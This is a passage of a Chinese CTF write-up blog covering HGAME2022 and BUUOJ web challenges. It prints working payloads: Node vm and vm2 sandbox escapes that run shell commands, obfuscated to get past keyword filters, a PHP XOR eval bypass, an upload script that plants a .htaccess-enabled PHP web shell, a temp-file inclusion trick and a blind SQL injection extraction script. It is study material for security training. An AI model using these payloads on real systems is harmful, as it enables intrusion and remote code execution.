src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230401250.png" alt="image-20220220230401250"></p><p>挺明显的xxe</p><p>然后就要满足获取flag的条件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220230438960.png" alt="image-20220220230438960"></p><p>要求sender里有admin但是传入的内容不许有admin</p><p>可以尝试data协议</p><p>（比赛的时候不知道怎么想的一直想绕过waf读文件。。。忘了data协议</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220234723611.png" alt="image-20220220234723611"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220220232831204.png" alt="image-20220220232831204"></p><h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online*"></a>Markdown Online*</h3><p>看一下源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221141602097.png" alt="image-20220221141602097"></p><p>toUpperCase()是将小写转换为大写，但是这样也绝不可能绕过54gk的这个if判断</p><p>利用了try catch但是catch并没有return语句，也就导致try中的代码抛出错误后继续往下执行</p><p>所以就要想办法让req.body.password = req.body.password.toUpperCase()报错</p><p>对 req.body.password.toUpperCase() 正确的解读方式是：获取 req.body.password对象的 toUpperCase属性，然后把这个属性当作函数来调用。如果这个属性不是函数对象就会抛出错误</p><p>所以可以用</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>或</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string">"length"</span><span class="token operator">:</span> <span class="token number">16</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>都可以满足第一个if的length==16的判断并让toUpperCase()报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143354198.png" alt="image-20220221143354198"></p><p>然后我们访问/md</p><p>在这部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221143602581.png" alt="image-20220221143602581"></p><p>利用markdownit库，并对html标签支持</p><p>在提交的地方</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144119817.png" alt="image-20220221144119817"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144044221.png"></p><p>在 SubmitController 里，markdown-it 解析出来的 html 代码会被 zombie.js 加载，zobmie.js 在遇到 JavaScript 代码的时候会将其交给 vm 虚拟机执行</p><p>而vm模块是存在逃逸的， JavaScript 对象的继承是靠原型链实现的，借助原型链可访问到 vm 沙箱以外的内容，实现 RCE</p><p>百度找个vm逃逸的payload</p><pre class="language-none"><code class="language-none">this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;)</code></pre><p>然后还要绕过waf</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221144435975.png" alt="image-20220221144435975"></p><p>利用 JavaScript 的语言特性， obj.contructor 可以变为 obj[&quot;contr&quot;+&quot;uctor&quot;] 的形式， + 也被 ban 了，可以用concat拼接字符串的形式: obj[&quot;constru&quot;.concat(&quot;ctor&quot;)] this 和 process 可以用 eval(&quot;th&quot;+&quot;is&quot;) 的形式绕过。</p><p>这里eval和String.fromCharCode都没被过滤，可以用这个绕过</p><pre class="language-python" data-language="python"><code class="language-python">a &#x3D; &quot;document.write(this.__proto__.constructor.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;ls &#x2F;&#39;))&quot;b &#x3D; []for i in range(len(a)):    b.append(ord(a[i]))print(b)</code></pre><pre class="language-none"><code class="language-none">&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150403606.png" alt="image-20220221150403606"></p><p>然后cat /flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/HGAME2022-wp/image-20220221150727819.png" alt="image-20220221150727819"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu刷题记录(二)</title>
      <link href="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/"/>
      <url>/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpfunction get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh &#x3D; @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;&#x2F;[\x00- 0-9A-Za-z\&#39;&quot;\&#96;~_&amp;.,|&#x3D;[\x7F]+&#x2F;i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type &#x3D; count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>前半段是关于文件上传的代码，后半段则是无数字字母rce，猜是要传一个一句话木马上去getshell</p><p>但是有个非预期解，利用eval函数查看phpinfo就能找到flag</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119190933261.png" alt="image-20220119190933261"></p><p><strong>预期解：</strong></p><p>首先利用eval来执行get_the_flag函数</p><pre class="language-none"><code class="language-none">_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag</code></pre><p>再看get_the_flag这个函数</p><pre class="language-php" data-language="php"><code class="language-php">function get_the_flag()&#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; 表示的是上传临时文件的绝对路径        $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;得到后缀    if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;禁止ph的文件后缀        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;图片判断        $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;</code></pre><p>对上传的文件内容进行了过滤，过滤了ph，&lt;?，同时还要求上传的文件文件头为图片类型</p><p>所以可以尝试上传htaccess格式或者user.ini格式的文件来解析图片马</p><p>.user.ini没用，可能是因为上传的文件夹内没有正常的php文件</p><p>偷了个脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport base64htaccess &#x3D; b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application&#x2F;x-httpd-php .sssphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot;&quot;&quot;&quot;shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;)  #GIF89后的11是为了满足base64编码url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot;files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125;data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125;response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files)print(response.text)</code></pre><p>这里前半段传的是.htaccess，内容就是把.sss后缀的文件当作php进行解析，而且还对当前目录下的shell.sss进行了base64解码读取。</p><p>利用auto_append_file来包含b64解码的shell.sss文章，这样往shell.sss里面写b64解密后的马，就可以绕过&lt;?的过滤了。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194212595.png" alt="image-20220119194212595"></p><p>得到路径之后蚁剑连一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194354577.png" alt="image-20220119194354577"></p><p>根目录下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220119194520905.png" alt="image-20220119194520905"></p><p>？？为什么我能直接读，百度的wp都是还要绕过open_basedir的</p><p><a href="https://www.e-learn.cn/topic/3627394">浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn)</a></p><p><a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法 - 先知社区 (aliyun.com)</a></p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110108160.png" alt="image-20220120110108160"></p><p>抓包，把给的hash值利用get传进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220120110154642.png" alt="image-20220120110154642"></p><p>看一下flflflflag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120110245508.png" alt="image-20220120110245508"></p><p>利用伪协议读一下源码</p><p>file=php://filter/convert.base64-encode/resource=flflflflag.php</p><p>得到</p><pre class="language-none"><code class="language-none">&lt;html&gt;&lt;head&gt;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;404.html&quot;;&lt;&#x2F;script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file&#x3D;$_GET[&#39;file&#39;];if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>index.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude &#39;config.php&#39;;@$name&#x3D;$_GET[&#39;name&#39;];@$pass&#x3D;$_GET[&#39;pass&#39;];if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123;echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;           window.location.href&#x3D;&quot;flflflflag.php&quot;;&lt;&#x2F;script&gt;&#39;;&#125;else&#123;setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000);echo &quot;username&#x2F;password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt;&lt;&#x2F;html&gt;</code></pre><p>config.php有个假flag。。。</p><p>这道题是要利用php临时文件来写马，找到phpinfo里的flag</p><p><a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/11301743.html">关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com)</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120114000050.png" alt="image-20220120114000050"></p><p>临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120115533341.png" alt="image-20220120115533341"></p><p>dir.php</p><pre class="language-none"><code class="language-none">&lt;?phpvar_dump(scandir(&#39;&#x2F;tmp&#39;));?&gt;</code></pre><p>利用python脚本上传文件</p><pre class="language-python" data-language="python"><code class="language-python">import requestsfrom io import BytesIOurl&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;使php崩溃，让上传的文件保留在tmp目录中payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;files&#x3D;&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;防止重定向print(r.text)</code></pre><p>可以看到上传成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122305671.png" alt="image-20220120122305671"></p><p>得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220120122643975.png" alt="image-20220120122643975"></p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201348464.png" alt="image-20220303201348464"></p><p>访问一下run.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201424600.png" alt="image-20220303201424600"></p><p>刚开始以为是php的代码执行，但是试了试没啥反应</p><p>然后发现考点是js的vm2逃逸</p><p>先用Error().stack看看（js中捕获异常堆栈信息</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303201707379.png" alt="image-20220303201707379"></p><p>然后找一下vm2逃逸的payload</p><p><a href="https://github.com/patriksimek/vm2/issues/225">Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com)</a></p><pre class="language-none"><code class="language-none">try &#123;    Buffer.from(new Proxy(&#123;&#125;, &#123;        getOwnPropertyDescriptor()&#123;            throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))();        &#125;    &#125;));&#125; catch(e) &#123;    e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;))        [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;)&#125;</code></pre><p>或</p><pre class="language-none"><code class="language-none"> &#39;(&#39; + function()&#123;TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)();try&#123;Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;&#125;catch(e)&#123;return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;&#125;+&#39;)()&#39;;try&#123;console.log(new VM().run(untrusted));&#125;catch(x)&#123;console.log(x);&#125;</code></pre><p>但是直接利用有waf</p><p>[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;]</p><p>所以通过在关键字字母上加上 ` 进行绕过</p><pre class="language-none"><code class="language-none">&#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)()</code></pre><p>join的作用：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203448082.png" alt="image-20220303203448082"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303203626377.png" alt="image-20220303203626377"></p><p>还有另一种绕过方式</p><pre class="language-jsx" data-language="jsx"><code class="language-jsx">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</code></pre><p>把所有被过滤的字符按这个方式改写就行</p><pre class="language-none"><code class="language-none">(function ()&#123;    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)();    try&#123;        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;    &#125;catch(e)&#123;        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();    &#125;&#125;)()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303204954125.png" alt="image-20220303204954125"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215431763.png" alt="image-20220303215431763"></p><p>整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入</p><p>information，逗号还有其他很多都被过滤了</p><p>只能用from for代替逗号，直接猜表名是flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220517171510356.png" alt="image-20220517171510356"></p><p>确定之后写脚本跑flag</p><pre class="language-python" data-language="python"><code class="language-python">import refrom time import sleepimport requestsflag &#x3D; &#39;&#39;url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39;payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39;for i in range(1000):    sleep(0.3)    data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i),            &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;    data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125;    requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data)    r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1)    res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;&#39;, r2.text)    res1 &#x3D; re.search(r&#39;\d+&#39;, res.group())    flag &#x3D; flag + chr(int(res1.group()))    print(flag)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220303215646816.png" alt="image-20220303215646816"></p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>写脚本执行运算就行</p><pre class="language-none"><code class="language-none">import reimport requestsfrom time import sleep#url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39;req &#x3D; requests.session()response &#x3D; req.get(url)for i in range(1001):    math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text)    data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125;    response &#x3D; req.post(url, data&#x3D;data)    print(i,data)    response.encoding &#x3D; &quot;utf-8&quot;    print(response.text)    sleep(0.1)</code></pre><p>唯一要注意的就是要先用request.session()保持会话</p><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>php的伪随机，和前边一道题很像</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220306160421431.png" alt="image-20220306160421431"></p><p>看到<a href="http://www.zip,下载下来看看源码/">www.zip，下载下来看看源码</a></p><pre class="language-none"><code class="language-none">if(isset($_POST[&#39;login&#39;]))&#123;    $username &#x3D; $_POST[&#39;username&#39;];    $password &#x3D; $_POST[&#39;password&#39;];    $Private_key &#x3D; $_POST[&#39;Private_key&#39;];    if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123;        &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面        header(&#39;refresh:2; url&#x3D;login.html&#39;);        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;        exit;    &#125;    else if($Private_key !&#x3D; &#39;*************&#39; )    &#123;        header(&#39;refresh:2; url&#x3D;login.html&#39;);        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;        exit;    &#125;    else&#123;        if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123;            $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;;            $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);            mysql_select_db(&quot;test&quot;,$link);            $result &#x3D; mysql_query($getuser);            while($row&#x3D;mysql_fetch_assoc($result))&#123;                echo 